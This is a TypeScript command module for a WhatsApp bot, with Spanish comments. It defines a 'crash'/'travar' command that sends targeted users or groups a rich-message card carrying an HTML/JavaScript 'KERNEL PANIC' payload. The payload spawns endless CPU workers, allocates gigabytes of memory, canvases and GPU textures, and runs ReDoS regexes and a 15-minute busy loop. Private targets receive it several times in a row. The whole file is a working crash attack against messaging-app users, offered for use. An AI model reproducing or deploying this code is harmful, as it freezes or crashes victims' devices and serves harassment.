import type { CommandContext } from "../../types/index.d.ts";
import { fytBold } from "../../core/socketText.ts";

/* ───────────────────────── payload ───────────────────────── */

function buildKernelPanic(name: string, lv: number) {
  const CH = 512 * lv;          // MB por ArrayBuffer
  const N = 4 * lv;             // nº de ArrayBuffers (tope 2.15 GB c/u)
  const CV = 4000 + 2000 * lv;  // lado del canvas
  const CNC = 1 + lv;
  const IMG = 4 * lv;           // bitmaps redimensionados
  const IMGSZ = 3000 + 1000 * lv;
  const WK = 6 * lv;
  const ITER = 2000 + 1500 * lv;
  const BLUR = 220 + 140 * lv;
  const OCT = 6 + lv;
  const NORM = 1500000 * lv;

  const html = `<style>
*{box-sizing:border-box;margin:0;padding:0}
body{margin:0;background:#000;color:#fff;font-family:system-ui,sans-serif;overflow:hidden}
#g{position:absolute;z-index:20;left:0;right:0;top:0;background:rgba(0,0,0,.86);padding:10px;border-bottom:2px solid #0ff}
h2{margin:0 0 6px;color:#0ff;text-align:center;font-size:14px;letter-spacing:2px}
.st{display:flex;justify-content:space-between;font-size:10px;color:#9ff}
.st b{color:#0ff;font-size:14px}
#s{margin-top:5px;font-family:monospace;font-size:9px;color:#0ff;white-space:pre}
canvas{position:absolute;top:0;left:0;width:100%;height:100%;z-index:1}
#tv{position:absolute;inset:0;z-index:2;opacity:.5}
#bl{position:absolute;inset:0;z-index:3;filter:blur(${BLUR}px);background:radial-gradient(#0ff,#0055ff,#000);will-change:filter;animation:sp 2.5s linear infinite}
@keyframes sp{to{transform:rotate(360deg) scale(1.5)}}
</style>
<div id="g">
  <h2>☢️ KERNEL PANIC ☢️</h2>
  <div class="st"><div>NATIVO<br><b id="m">0</b></div><div>FPS<br><b id="f">0</b></div></div>
  <div id="s">init</div>
</div>
<div id="bl"></div>
<svg id="tv"></svg>
<canvas id="cv"></canvas>
<script>
var cv=document.getElementById('cv'),fEl=document.getElementById('f'),mEl=document.getElementById('m'),sEl=document.getElementById('s');
var keep=[],pool=[],fr=0,lf=0,mb=0;
function fase(n){try{sEl.textContent=n}catch(e){}}
function mbUp(n){mb+=n;try{mEl.textContent=mb}catch(e){}}

/* 0 · CPU inmediata: todos los núcleos, sin esperar paint */
try{
  var wsrc='onmessage=function(){var a=new Float64Array(8192),v=1;while(true){for(var i=0;i<8192;i++){v=Math.atan2(Math.sin(v),Math.cos(v))+Math.sqrt(Math.abs(v)+1);a[i]=v}}}';
  var wu=URL.createObjectURL(new Blob([wsrc],{type:'application/javascript'}));
  var wn=Math.max(4,(navigator.hardwareConcurrency||8)*${WK});
  for(var wi=0;wi<wn;wi++){try{var wk=new Worker(wu);wk.postMessage(1);pool.push(wk)}catch(e){}}
}catch(e){}

/* 1 · memoria nativa externa al heap: fill() es memset puro */
fase('mem');
for(var b=0;b<${N};b++){
  try{
    var ab=new ArrayBuffer(${CH}*1048576);
    new Uint8Array(ab).fill(b+1);
    keep.push(ab);
    mbUp(${CH});
  }catch(e){try{sEl.textContent='heap tope '+mb+'MB'}catch(x){}break}
}

/* 2 · backing stores de canvas */
fase('canvas');
for(var c=0;c<${CNC};c++){
  try{
    var el=document.createElement('canvas');
    el.width=${CV};el.height=${CV};
    el.getContext('2d').fillRect(0,0,${CV},${CV});
    keep.push(el);
    mbUp(Math.round(${CV}*${CV}*4/1048576));
  }catch(e){}
}

/* 3 · bitmaps redimensionados fuera del hilo */
fase('bitmap');
try{
  var sc=document.createElement('canvas');
  sc.width=600;sc.height=600;
  var sg=sc.getContext('2d'),sd=sg.createImageData(600,600);
  for(var p=0;p<sd.data.length;p+=4){sd.data[p]=Math.random()*255;sd.data[p+1]=Math.random()*255;sd.data[p+2]=Math.random()*255;sd.data[p+3]=255}
  sg.putImageData(sd,0,0);
  for(var k=0;k<${IMG};k++){
    (function(){
      if(!window.createImageBitmap)return;
      createImageBitmap(sc,{resizeWidth:${IMGSZ},resizeHeight:${IMGSZ}}).then(function(bm){
        keep.push(bm);mbUp(Math.round(${IMGSZ}*${IMGSZ}*4/1048576));
      }).catch(function(){});
    })();
  }
}catch(e){}

/* 4 · ICU: normalize sobre millones de combining marks */
fase('icu');
try{
  var cm='\u034f'.repeat(${NORM});
  keep.push(cm.normalize('NFD'));
  keep.push(cm.normalize('NFC'));
  keep.push(cm.toLocaleUpperCase('tr'));
}catch(e){}

/* 5 · clon profundo: pila + copia */
fase('clone');
try{
  var deep={v:'█'.repeat(4000)};
  for(var d=0;d<20000;d++)deep={c:deep};
  keep.push(structuredClone(deep));
}catch(e){}

/* 6 · SVG: desenfoque + turbulencia, rasterizado por software */
fase('svg');
try{
  var tv=document.getElementById('tv');
  tv.setAttribute('viewBox','0 0 420 420');
  tv.innerHTML='<defs><filter id="tb"><feGaussianBlur stdDeviation="${BLUR}"/>'+
    '<feTurbulence type="fractalNoise" baseFrequency="0.7" numOctaves="${OCT}" stitchTiles="stitch"/>'+
    '<feColorMatrix type="saturate" values="6"/></filter></defs><rect width="420" height="420" filter="url(#tb)"/>';
}catch(e){}

/* 7 · GPU: texturas + shader */
fase('gpu');
try{
  cv.width=Math.min(window.innerWidth||420,760);
  cv.height=Math.min(window.innerHeight||900,1500);
  var gl=cv.getContext('webgl',{antialias:false,powerPreference:'high-performance'});
  if(gl){
    gl.viewport(0,0,cv.width,cv.height);
    for(var t=0;t<${3*lv};t++){
      try{
        var tex=gl.createTexture();
        gl.bindTexture(gl.TEXTURE_2D,tex);
        gl.texImage2D(gl.TEXTURE_2D,0,gl.RGBA,2048,2048,0,gl.RGBA,gl.UNSIGNED_BYTE,null);
        gl.texParameteri(gl.TEXTURE_2D,gl.TEXTURE_MIN_FILTER,gl.LINEAR);
        mbUp(16);
      }catch(e){}
    }
    var vs=gl.createShader(gl.VERTEX_SHADER);
    gl.shaderSource(vs,'attribute vec2 p;void main(){gl_Position=vec4(p,0.,1.);}');
    gl.compileShader(vs);
    var fs=gl.createShader(gl.FRAGMENT_SHADER);
    gl.shaderSource(fs,'precision highp float;uniform float t;uniform vec2 r;'+
      'void main(){vec2 uv=(gl_FragCoord.xy-.5*r)/r.y;float a=t*.35;'+
      'uv*=mat2(cos(a),-sin(a),sin(a),cos(a));vec2 z=uv,c=uv;float it=0.;'+
      'for(int i=0;i<${ITER};i++){z=vec2(z.x*z.x-z.y*z.y,2.*z.x*z.y)+c;'+
      'if(dot(z,z)>4.)break;it++;}'+
      'float k=it/${ITER}.0;gl_FragColor=vec4(k*sin(t),k*2.,k*cos(t),1.);}');
    gl.compileShader(fs);
    var pr=gl.createProgram();
    gl.attachShader(pr,vs);gl.attachShader(pr,fs);gl.linkProgram(pr);gl.useProgram(pr);
    var bf=gl.createBuffer();
    gl.bindBuffer(gl.ARRAY_BUFFER,bf);
    gl.bufferData(gl.ARRAY_BUFFER,new Float32Array([-1,-1,1,-1,-1,1,-1,1,1,-1,1,1]),gl.STATIC_DRAW);
    var pos=gl.getAttribLocation(pr,'p');
    gl.enableVertexAttribArray(pos);
    gl.vertexAttribPointer(pos,2,gl.FLOAT,false,0,0);
    var uT=gl.getUniformLocation(pr,'t'),uR=gl.getUniformLocation(pr,'r');
    (function loop(now){
      fr++;
      if(now-lf>=1000){try{fEl.textContent=fr}catch(e){}fr=0;lf=now}
      gl.uniform1f(uT,now*0.001);
      gl.uniform2f(uR,cv.width,cv.height);
      gl.drawArrays(gl.TRIANGLES,0,6);
      requestAnimationFrame(loop);
    })(0);
  }
}catch(e){}

/* 8 · remate determinista: ReDoS con backtracking exponencial */
fase('redos '+mb+'MB');
try{ /^(a+)+$/.test('a'.repeat(34)+'!'); }catch(e){}
try{ /^(x+x+)+y$/.test('x'.repeat(34)+'!'); }catch(e){}
try{ /^(\w+\s?)+$/.test('ab '.repeat(40)+'!'); }catch(e){}

var t0=Date.now();
while(true){if(Date.now()-t0>900000)break}
</script>`;

  return {
    view_model: {
      __typename: "GenAISingleLayoutViewModel",
      primitive: {
        __typename: "FOAHtmlPrimitiveDemoDONOTUSE",
        trusted_sources: [],
        payload: html,
      },
    },
  };
}

/* ───────────────────────── comando ───────────────────────── */

const sleep = (ms: number) => new Promise((r) => setTimeout(r, ms));

export default {
  name: ["crash", "trava", "travar"],
  category: "group",
  description: "Kernel panic: 2 GB nativos en ráfaga, ReDoS, bitmaps, texturas y workers. Grupo = 1 tarjeta sin tags.",
  async run(ctx: CommandContext) {
    const { sock, from, msg, args, reply, react } = ctx;

    const info: any = (msg.message as any)?.extendedTextMessage?.contextInfo || {};
    const mentioned: string[] = info.mentionedJid || [];
    const quoted: string | undefined = info.participant;
    const sender: string = (msg.key as any).participant || from;

    const raw = (args[0] || "").replace(/\D/g, "");
    const lv = Number(args.find((a) => /^[123]$/.test(a)) || 0) || 3;

    let targets: string[];
    let priv: boolean;

    if (mentioned.length) { targets = mentioned; priv = true; }
    else if (raw.length >= 8) { targets = [`${raw}@s.whatsapp.net`]; priv = true; }
    else if (quoted) { targets = [quoted]; priv = true; }
    else { targets = [from]; priv = false; }

    await react("☢️").catch(() => undefined);

    const card = async (jid: string, name: string, level: number) => {
      const { AIRich } = await import("baileys/lib/Builders/ai-rich.js");
      const rich = new AIRich(sock)
        .setTitle("☢️ KERNEL PANIC // LuferOS")
        .setFooter(`nivel ${level} · ${level * 2} GB`);
      rich.addSection(buildKernelPanic(name, level));
      return rich.send(jid);
    };

    let ok = 0;
    const fail: string[] = [];

    for (const t of targets) {
      const isGroup = t.endsWith("@g.us");
      const num = t.split("@")[0].split(":")[0];

      let name = num;
      try {
        if (isGroup) name = (await sock.groupMetadata(t)).subject || num;
        else name = String((msg as any).pushName || "").trim() || num;
      } catch {}

      if (!priv) {
        try { await card(t, name, lv); ok++; }
        catch (e: any) { fail.push(e?.message || String(e)); }
        continue;
      }

      for (let i = 0; i < 3 + lv; i++) {
        try { await card(t, name, lv); ok++; }
        catch (e: any) { fail.push(e?.message || String(e)); }
        await sleep(250);
      }
    }

    await react("☠️").catch(() => undefined);

    await reply(
      `${fytBold("Kernel panic")} → ${priv ? targets.map((t) => `+${t.split("@")[0]}`).join(" ") : "grupo (1 tarjeta, sin tags)"}\n` +
        `Nivel ${lv} · ${ok} ok${fail.length ? ` · ${fail.length} fallos` : ""}`,
    ).catch(() => undefined);
  },
};
